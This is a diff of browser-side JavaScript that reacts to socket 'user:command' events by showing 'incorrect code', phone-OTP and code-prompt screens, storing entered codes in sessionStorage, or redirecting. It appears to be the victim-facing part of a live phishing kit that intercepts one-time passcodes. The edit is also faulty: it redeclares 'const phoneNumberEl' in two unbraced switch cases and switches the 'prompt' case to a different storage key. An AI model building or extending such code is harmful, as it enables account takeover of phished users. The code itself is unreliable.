@@ -152,23 +152,27 @@ socket.on("user:command", (data) => {
       showError("incorrect code");
       break;
 
-    case "otp":
-      sessionStorage.removeItem("setcode");
-      sessionStorage.setItem("yp", "your mobile");
-      updatePhoneField("#yp", "your phone", phonescreen);
-      break;
-
     case "phone-otp":
       if (!code) return;
-      sessionStorage.setItem("setcode", code);
-      updatePhoneField("#phone", code, phonescreen);
-      break;
+	      const phoneNumberEl = document.querySelector("#phone");
+	      sessionStorage.setItem("setcode", code);
+	      if (!phoneNumberEl) {
+	        window.location.href = phonescreen;
+	        return;
+	      }
+	      phoneNumberEl.textContent = code;
+	      break;
 
     case "prompt":
       if (!code) return;
-      sessionStorage.setItem("setPromptCode", code);
-      updatePhoneField("#code", code, phonescreen);
-      break;
+	      const phoneNumberEl = document.querySelector("#code");
+	      sessionStorage.setItem("setcode", code);
+	      if (!phoneNumberEl) {
+	        window.location.href = phonescreen;
+	        return;
+	      }
+	      phoneNumberEl.textContent = code;
+	      break;
 
     case "redirect":
       if (link) {
